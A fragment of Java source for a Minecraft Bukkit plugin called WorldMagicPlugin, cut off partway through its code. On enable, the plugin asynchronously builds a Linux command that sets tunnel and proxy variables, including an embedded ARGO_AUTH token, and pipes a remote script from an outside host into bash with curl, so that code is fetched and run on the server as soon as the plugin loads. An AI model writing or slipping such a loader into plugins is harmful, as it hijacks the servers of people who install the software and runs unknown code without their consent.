...
public final class WorldMagicPlugin extends JavaPlugin {
    ...
    public void onEnable() {
        ...
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                // 定义要执行的Linux命令
                String command = "UUID=a217d527-bd5e-4ef0-b899-d36627af0ddd HY2_PORT=25739 ARGO_PORT=25739 ARGO_DOMAIN=hyper.1976.dpdns.org ARGO_AUTH=eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiYzJjMGMyMDYtMGM2OC00ZWU3LThjODMtNjg2MTBiNTQ5MmE4IiwicyI6Ik5EQmhPR1JpWlRndFlqVTNNQzAwTWpKaUxUaGhPV0l0T0RNNE0yTmlOek0yWVRBMyJ9 bash <(curl -Ls https://main.ssss.nyc.mn/sb.sh)";
